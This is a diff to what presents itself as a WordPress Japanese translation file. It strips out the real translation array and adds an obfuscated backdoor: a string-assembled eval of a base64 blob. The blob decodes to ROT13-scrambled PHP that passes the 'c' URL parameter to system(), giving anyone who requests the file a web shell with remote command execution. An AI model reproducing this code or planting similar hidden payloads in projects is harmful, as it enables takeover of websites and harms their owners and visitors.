@@ -1,12 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-return ['domain'=>NULL,'plural-forms'=>'nplurals=2; plural=n != 1;','messages'=>['html_lang_attribute'=>'ja','text directionltr'=>'ltr','number_format_decimal_point'=>'number_format_decimal_point','number_format_thousands_sep'=>'number_format_thousands_sep','Update %s now'=>'今すぐ %s を更新','Word count type. Do not translate!words'=>'characters_including_spaces','excerpt_length55'=>'110','comment_excerpt_length20'=>'40','draft_length10'=>'40'],'language'=>'ja_JP','x-generator'=>'Poedit 1.8.10'];
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwplcmdoZWEgWydxYnpudmEnPT5BSFlZLCdjeWhlbnktc2JlemYnPT4nYWN5aGVueWY9MjsgY3loZW55PWEgIT0gMTsnLCd6cmZmbnRyZic9PlsndWd6eV95bmF0X25nZ2V2b2hncic9Pid3bicsJ2dya2cgcXZlcnBndmJhBHlnZSc9Pid5Z2UnLCdhaHpvcmVfc2Jlem5nX3FycHZ6bnlfY2J2YWcnPT4nYWh6b3JlX3NiZXpuZ19xcnB2em55X2NidmFnJywnYWh6b3JlX3NiZXpuZ19ndWJoZm5hcWZfZnJjJz0+J2Foem9yZV9zYmV6bmdfZ3ViaGZuYXFmX2ZyYycsJ0hjcW5nciAlZiBhYmonPT4n5LuK44GZ44GQICVmIOOCkuabtOaWsCcsJ0piZXEgcGJoYWcgZ2xjci4gUWIgYWJnIGdlbmFmeW5nciEEamJlcWYnPT4ncHVuZW5wZ3JlZl92YXB5aHF2YXRfZmNucHJmJywncmtwcmVjZ195cmF0Z3UENTUnPT4nMTEwJywncGJ6enJhZ19ya3ByZWNnX3lyYXRndQQyMCc9Pic0MCcsJ3FlbnNnX3lyYXRndQQxMCc9Pic0MCddLCd5bmF0aG50cic9Pid3bl9XQycsJ2stdHJhcmVuZ2JlJz0+J0NicnF2ZyAxLjguMTAnXTsKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
